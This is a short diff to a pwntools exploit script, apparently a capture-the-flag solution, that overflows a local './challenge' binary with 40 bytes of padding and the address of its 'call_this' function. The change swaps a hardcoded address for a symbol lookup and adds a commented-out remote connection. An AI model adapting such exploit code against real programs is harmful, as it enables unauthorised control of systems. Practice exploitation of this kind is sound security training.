@@ -2,12 +2,13 @@
 
 from pwn import *
 
-import sys
-
-payload = b'a' * 40 + p64(0x400606)
+payload = b'a' * 40 + p64(ELF("./challenge").symbols.call_this)
 
 p = process("./challenge")
+# p = remote('localhost', 1001)
 
 p.sendline(payload)
 
 print(p.recvall().decode(), end='')
+
+# p.close()
